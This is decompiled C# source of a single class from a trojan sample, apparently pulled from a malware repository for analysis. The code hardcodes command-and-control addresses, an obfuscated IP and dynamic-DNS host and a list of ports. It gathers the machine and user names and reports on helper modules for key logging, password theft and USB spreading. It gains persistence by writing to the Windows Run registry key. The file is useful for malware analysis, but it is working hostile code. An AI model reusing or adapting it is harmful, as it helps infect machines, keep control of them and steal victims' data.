// Decompiled with JetBrains decompiler
// Type: gltadbrigr.WCRUONF
// Assembly: gltadbrigr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 90EF545C-9E75-40E4-A102-AD83A77103BB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4342dd4999d1247fc9032003bafb7d3d58d2cbefe1705d5d91e258d0ed1fef86.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace gltadbrigr
{
  internal static class WCRUONF
  {
    public static string gltadbrigrpaslogs = "thvidmsic|gltadbrigr".Split('|')[0];
    public static string filePath = Application.ExecutablePath;
    public static string gltadbrigrflshPath = "\\Draricw\\|gltadbrigr".Split('|')[0];
    public static string gltadbrigrusbData = "data|gltadbrigr".Split('|')[0];
    public static string gltadbrigrpssApp = "rnvfdas|gltadbrigr".Split('|')[0];
    public static string gltadbrigrkiyApp = "rvrndhaci|gltadbrigr".Split('|')[0];
    public static string gltadbrigrmainApp = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
    public static string gltadbrigrpc_id = "rmther|gltadbrigr".Split('|')[0];
    public static byte[] gltadbrigrvpsips = new byte[29]
    {
      (byte) 49,
      (byte) 56,
      (byte) 53,
      (byte) 46,
      (byte) 49,
      (byte) 57,
      (byte) 55,
      (byte) 46,
      (byte) 50,
      (byte) 52,
      (byte) 57,
      (byte) 46,
      (byte) 50,
      (byte) 52,
      (byte) 55,
      (byte) 63,
      (byte) 115,
      (byte) 104,
      (byte) 97,
      (byte) 114,
      (byte) 101,
      (byte) 98,
      (byte) 111,
      (byte) 120,
      (byte) 115,
      (byte) 46,
      (byte) 110,
      (byte) 101,
      (byte) 116
    };
    public static int gltadbrigrport = 8543;
    public static RegistryKey winVwe = (RegistryKey) null;
    public static int[] ports = new int[5]
    {
      8543,
      4858,
      16252,
      18696,
      20862
    };
    public static string gltadbrigrapver;
    public static string gltadbrigrcname = "";
    public static string gltadbrigruname = "";
    public static string gltadbrigrlancard = "";
    public static string gltadbrigruip = "";
    public static string gltadbrigrdefaultP = "102.211.115.201|gltadbrigr".Split('|')[0];
    public static string gltadbrigrremvUser = "wirvedadr|gltadbrigr".Split('|')[0];
    public static string gltadbrigrkeePath = "\\Dltwdhig\\|gltadbrigr".Split('|')[0];
    public static string gltadbrigrusbApp = "vrbrcaties|gltadbrigr".Split('|')[0];
    public static string gltadbrigrpasPath = "\\Dhidawas\\|gltadbrigr".Split('|')[0];

    public static byte[] getByteArray(string value)
    {
      MemoryStream memoryStream = new MemoryStream();
      TextWriter textWriter = (TextWriter) new StreamWriter((Stream) memoryStream);
      textWriter.Write(value);
      textWriter.Flush();
      memoryStream.Flush();
      return memoryStream.ToArray();
    }

    public static string gltadbrigrget_mupath() => Path.GetDirectoryName(WCRUONF.filePath) + "\\";

    public static void gltadbrigrInfo()
    {
      WCRUONF.gltadbrigrapver = "AT02!gltadbrigr".Split('!')[0];
      WCRUONF.gltadbrigrcname = Environment.MachineName;
      WCRUONF.gltadbrigruname = Environment.UserName;
    }

    public static string gltadbrigrusbuPath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + WCRUONF.gltadbrigrflshPath;

    public static string gltadbrigrkiuPath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + WCRUONF.gltadbrigrkeePath;

    public static byte[] gltadbrigrapps_sutatus()
    {
      try
      {
        string str1 = "0.0.0.0|gltadbrigr".Split('|')[0];
        string str2 = "true!gltadbrigr".Split('!')[0];
        string str3 = "maina#Runing|ver#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrapver + "|name#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrmainApp + "|path#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrget_mupath() + "|fileslog=!gltadbrigr".Split('!')[0] + "N/A|apkey#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrpc_id + ">|gltadbrigr".Split('|')[0];
        string productVersion1;
        string str4;
        if (File.Exists(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp + ".exe!gltadbrigr".Split('!')[0]))
        {
          productVersion1 = FileVersionInfo.GetVersionInfo(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp + ".exe!gltadbrigr".Split('!')[0]).ProductVersion;
          if (Process.GetProcessesByName(WCRUONF.gltadbrigrkiyApp).Length == 0)
            str4 = "Not Runing!gltadbrigr".Split('!')[0];
          else
            str4 = "Runing!gltadbrigr".Split('!')[0];
        }
        else
        {
          productVersion1 = "0.0.0.0!gltadbrigr".Split('!')[0];
          str4 = "Not Present!gltadbrigr".Split('!')[0];
        }
        string str5 = str3 + "keeap#!gltadbrigr".Split('!')[0] + str4 + "|ver#!gltadbrigr".Split('!')[0] + productVersion1 + "|name#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrkiyApp + "|path#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrkiuPath() + "|logfile#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrkiyApp + ">|gltadbrigr".Split('|')[0];
        string productVersion2;
        string str6;
        if (File.Exists(WCRUONF.gltadbrigrget_pupath() + WCRUONF.gltadbrigrpssApp + ".exe!gltadbrigr".Split('!')[0]))
        {
          productVersion2 = FileVersionInfo.GetVersionInfo(WCRUONF.gltadbrigrget_pupath() + WCRUONF.gltadbrigrpssApp + ".exe!gltadbrigr".Split('!')[0]).ProductVersion;
          str6 = "Present!gltadbrigr".Split('!')[0];
        }
        else
        {
          productVersion2 = "0.0.0.0!gltadbrigr".Split('!')[0];
          str6 = "Not Present!gltadbrigr".Split('!')[0];
        }
        string str7 = str5 + "pasap#!gltadbrigr".Split('!')[0] + str6 + "|ver#!gltadbrigr".Split('!')[0] + productVersion2 + "|name#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrpssApp + "|path#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrget_pupath() + "|logfile#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrpssApp + ">|gltadbrigr".Split('|')[0];
        string productVersion3;
        string str8;
        if (File.Exists(WCRUONF.gltadbrigrusbuPath() + WCRUONF.gltadbrigrusbApp + ".exe!gltadbrigr".Split('!')[0]))
        {
          productVersion3 = FileVersionInfo.GetVersionInfo(WCRUONF.gltadbrigrusbuPath() + WCRUONF.gltadbrigrusbApp + ".exe!gltadbrigr".Split('!')[0]).ProductVersion;
          if (Process.GetProcessesByName(WCRUONF.gltadbrigrusbApp).Length == 0)
            str8 = "Not Runing!gltadbrigr".Split('!')[0];
          else
            str8 = "Runing!gltadbrigr".Split('!')[0];
        }
        else
        {
          productVersion3 = "0.0.0.0!gltadbrigr".Split('!')[0];
          str8 = "Not Present!gltadbrigr".Split('!')[0];
        }
        return WCRUONF.getByteArray(str7 + "usbap#!gltadbrigr".Split('!')[0] + str8 + "|ver#!gltadbrigr".Split('!')[0] + productVersion3 + "|name#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrusbApp + "|path#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrusbuPath() + "|logfile#!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrusbApp + "|usbwrm#!gltadbrigr".Split('!')[0] + ">|gltadbrigr".Split('|')[0]);
      }
      catch
      {
        return (byte[]) null;
      }
    }

    public static string gltadbrigrget_pupath() => Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + WCRUONF.gltadbrigrpasPath;

    public static void gltadbrigrset_ruun(string app, string path)
    {
      try
      {
        string str = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|gltadbrigr";
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(str.Split('|')[0], true);
        object obj = registryKey.GetValue(WCRUONF.gltadbrigrpc_id + app);
        if (obj != null && !(obj.ToString() != path))
          return;
        registryKey.SetValue(WCRUONF.gltadbrigrpc_id + app, (object) path);
      }
      catch
      {
      }
    }

    public static string gltadbrigrOusname()
    {
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        int num = osVersion.Version.Major;
        string str1 = num.ToString();
        num = osVersion.Version.Minor;
        string str2 = num.ToString();
        return str1 + ">" + str2;
      }
      catch
      {
        return "6>1!gltadbrigr".Split('!')[0];
      }
    }
  }
}
